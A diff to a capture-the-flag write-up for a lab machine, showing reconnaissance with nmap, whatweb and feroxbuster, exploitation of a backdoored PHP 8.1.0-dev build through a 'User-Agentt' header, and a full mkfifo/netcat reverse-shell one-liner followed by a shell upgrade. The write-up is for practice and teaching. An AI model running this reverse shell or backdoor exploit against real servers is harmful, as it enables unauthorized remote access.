@@ -25,11 +25,15 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+<hr>
+
 I also ran `whatweb` with `-a 3` for aggressive (comprehensive) information gathering about the website<br>
 `whatweb -a 3 10.10.10.242`
 ```
 http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
 ```
+<hr>
+
 The website didn't appear to have any links or directories so i try dirbusting with `feroxbuster` but no use either<br>
 `feroxbuster -r -k -E -g -C 400,403,404 --auto-tune -u http://10.10.10.242/`
 ```
@@ -63,6 +67,7 @@ I try `dirsearch` just to be sure but no luck either<br>
 The server was running `Apache 2.4.41` and using `PHP 8.1.0-dev`
 Looking up `php 8.1.0 exploit` leads to this:<br>
 https://www.exploit-db.com/exploits/49933
+<hr>
 
 The cause of the exploit was an early realease which contained a backdoor<br>
 The backdoor was removed but any server that still runs this version allows an attacker to execute arbitrary code by sending the `User-Agentt` header
@@ -79,9 +84,11 @@ In that case, i opened `netcat` listner on port 4444 and executed reverse shell 
 - `nc -lvnp 4444` (listener)
 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)<br>
 <hr>
+
 Having reverse shell from `nc`, i upgraded to `interactive shell`<br>
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 <hr>
+
 There was only 1 directory inside `/home` called `james` (which is who we are - `whoami`)<br>
 The user flag can be found inside `/home/james/user.txt`<br>
 After that i started checking common things but the exploits for them didn't work
